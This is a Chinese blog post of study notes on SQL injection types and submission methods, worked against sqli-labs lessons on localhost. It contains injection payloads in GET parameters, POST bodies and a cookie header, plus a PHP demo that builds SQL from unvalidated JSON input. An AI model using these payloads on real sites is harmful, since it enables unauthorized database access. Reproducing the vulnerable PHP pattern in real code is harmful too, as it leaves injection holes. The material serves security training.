@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Al0nez" />
+
+
+
+<meta name="description" content="前言在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="14WEB漏洞--SQL注入之类型及提交注入">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Al0nez&#39;s Bolg">
+<meta property="og:description" content="前言在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104686.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104698.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104702.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104704.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104533.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104462.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104487.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104559.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104563.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104014.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104602.png">
+<meta property="article:published_time" content="2021-09-21T02:28:58.000Z">
+<meta property="article:modified_time" content="2021-09-21T03:22:16.143Z">
+<meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="小迪学习笔记">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104686.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Al0nez&#39;s Bolg" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>14WEB漏洞--SQL注入之类型及提交注入 | Al0nez&#39;s Bolg</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Al0nez</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Al0nez</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Al0nez</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-14WEB漏洞-SQL注入之类型及提交注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/" class="article-date">
+      <time datetime="2021-09-21T02:28:58.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      14WEB漏洞--SQL注入之类型及提交注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">小迪学习笔记</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。</p>
+<span id="more"></span>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104686.png" alt="image-20210826171130322"></p>
+<h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h3><p>数字，字符，搜索，JSON 等</p>
+<h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104698.png" alt="image-20210826171444372"></p>
+<p>可以看到<code>id=1</code>，是数字型</p>
+<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104702.png" alt="image-20210826171553422"></p>
+<p> <code>email_id =&#39;Dumb@dhakkan.com&#39;</code>我们必须用’或者’’包裹，否则会报错，因为他是字符型。</p>
+<h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[&#x27;x&#x27;]</span><br><span class="line">$sql = &quot;select * from user where name = &#x27;$name&#x27;&quot;</span><br><span class="line">我们如果要注入就必须这样写</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+正确</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+错误</span><br><span class="line">带到数据库中</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi&#x27; and 1=1 --+&#x27;&quot; 正确</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi and 1=1 --+&#x27;&quot; 错误</span><br></pre></td></tr></table></figure>
+
+<h4 id="干扰符号"><a href="#干扰符号" class="headerlink" title="干扰符号"></a>干扰符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般是&#x27;,&quot;,%,),&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">&#x27;id&#x27;</span><br><span class="line">&quot;id&quot;</span><br><span class="line">(&#x27;id&#x27;)</span><br><span class="line">(&quot;id&quot;)</span><br><span class="line">&quot;&#x27;id&#x27;&quot;</span><br><span class="line">(&quot;&#x27;id&#x27;&quot;)</span><br><span class="line">(&#x27;&quot;id&quot;&#x27;)</span><br><span class="line">&#x27;%id%&#x27;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET,POST,COOKIE,REQUEST,HTTP 头等</span><br></pre></td></tr></table></figure>
+
+<p>可以在network中查看</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104704.png" alt="image-20210826172933628"></p>
+<h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>直接在浏览器后面添加参数就可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?id=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要通过POST请求来写入参数</span><br></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104533.png" alt="image-20210826173620822" style="zoom:67%;" />
+
+<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要将cookie写入请求头中才可以传递</span><br><span class="line">cookie:c=xxxxx</span><br></pre></td></tr></table></figure>
+
+<h4 id="REQUEST请求"><a href="#REQUEST请求" class="headerlink" title="REQUEST请求"></a>REQUEST请求</h4><p> REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</p>
+<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><p>$_SERVER是PHP里内置变量，全局变量，PHP写脚本时用它来获取系统的值，在数据包的某一个地方可以进行注入</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104462.png" alt="image-20210826174348974"></p>
+<h3 id="JSON注入相关知识"><a href="#JSON注入相关知识" class="headerlink" title="JSON注入相关知识"></a>JSON注入相关知识</h3><h4 id="JSON基础"><a href="#JSON基础" class="headerlink" title="JSON基础"></a>JSON基础</h4><p>简介</p>
+<p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”</p>
+<p>JSON语法</p>
+<ul>
+<li>数据在名称/值对中</li>
+<li>数据由逗号分隔</li>
+<li>大括号保存对象</li>
+<li>中括号保存数组</li>
+</ul>
+<p>JSON值</p>
+<ul>
+<li>数字（整数或浮点数） {“age”:30 }</li>
+<li>字符串（在双引号中） {“uname”:”yang”}</li>
+<li>逻辑值（true 或 false） {“flag”:true }</li>
+<li>数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}</li>
+<li>对象（在大括号中）JSON 对象在大括号（{}）中书写：</li>
+<li>null  { “runoob”:null }</li>
+</ul>
+<p>JSON代码格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;users&quot;: &#123;</span><br><span class="line">    &quot;user&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;admin888&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;2&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;root123&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;3&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;system&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;system456&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h4><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="参数字符型注入测试"><a href="#参数字符型注入测试" class="headerlink" title="参数字符型注入测试"></a>参数字符型注入测试</h4><h5 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h5><p>单引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=3&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104487.png" alt="image-20210826200648215"></p>
+<h5 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h5><p>双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-6/?id=3&quot; and 1=1--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104559.png" alt="image-20210826200804673"></p>
+<h4 id="POST-数据提交注入测试"><a href="#POST-数据提交注入测试" class="headerlink" title="POST 数据提交注入测试"></a>POST 数据提交注入测试</h4><h5 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=2 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104563.png" alt="image-20210826201256873"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104014.png" alt="image-20210826201313639"></p>
+<p> 参数 JSON 数据注入测试=&gt;本地环境代码演示</p>
+<h4 id="COOKIE-数据提交注入测试"><a href="#COOKIE-数据提交注入测试" class="headerlink" title="COOKIE 数据提交注入测试"></a>COOKIE 数据提交注入测试</h4><p>需要先登录，然后进行cookie注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli/Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/sqli/Less-20/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=admi&#x27; union select 1,database(),3#; csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104602.png" alt="image-20210826203427162"></p>
+<h4 id="HTTP-头部参数数据注入测试"><a href="#HTTP-头部参数数据注入测试" class="headerlink" title="HTTP 头部参数数据注入测试"></a>HTTP 头部参数数据注入测试</h4><p>UA头注入</p>
+<p>闭合掉前面的，使用报错注入</p>
+<h4 id="配合-sqlilabs-本地数据库演示"><a href="#配合-sqlilabs-本地数据库演示" class="headerlink" title="配合 sqlilabs 本地数据库演示"></a>配合 sqlilabs 本地数据库演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;json&#x27;]))&#123;</span><br><span class="line">$json_str=$_POST[&#x27;json&#x27;];</span><br><span class="line">$json=json_decode($json_str);</span><br><span class="line">if(!$json)&#123;</span><br><span class="line">die(&#x27;JSON 文档格式有误，请检查&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$json-&gt;username;</span><br><span class="line">//$passwd=$json-&gt;passwd;</span><br><span class="line">$mysqli=new mysqli();</span><br><span class="line">$mysqli-&gt;connect(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if($mysqli-&gt;connect_errno)&#123;</span><br><span class="line">die(&#x27;数据库连接失败：&#x27;.$mysqli-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;select_db(&#x27;security&#x27;);</span><br><span class="line">if($mysqli-&gt;errno)&#123;</span><br><span class="line">dir(&#x27;打开数据库失败：&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;set_charset(&#x27;utf-8&#x27;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br><span class="line">if(!$result)&#123;</span><br><span class="line">die(&#x27;执行 SQL 语句失败：&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;else if($result-&gt;num_rows==0)&#123;</span><br><span class="line">die(&#x27;查询结果为空&#x27;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">echo &quot;用户名：&#123;$array1[0][&#x27;username&#x27;]&#125;,密码：&#123;$array1[0][&#x27;password&#x27;]&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">14WEB漏洞--SQL注入之类型及提交注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
+        <p><span>发布时间:</span>2021-09-21, 10:28:58</p>
+        <p><span>最后更新:</span>2021-09-21, 11:22:16</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/" title="14WEB漏洞--SQL注入之类型及提交注入">https://al0nez.github.io/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">
+                    15WEB漏洞--SQL注入之Oracle、MongoDB注入
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/">
+                    13WEB漏洞--SQL注入之MYSQL注入
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E6%98%8E%E7%A1%AE%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">简要明确参数类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">2.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%A6%82"><span class="toc-number">2.3.</span> <span class="toc-text">例如</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B9%B2%E6%89%B0%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.4.</span> <span class="toc-text">干扰符号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E6%98%8E%E7%A1%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">简要明确请求方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82"><span class="toc-number">3.1.</span> <span class="toc-text">GET请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">3.2.</span> <span 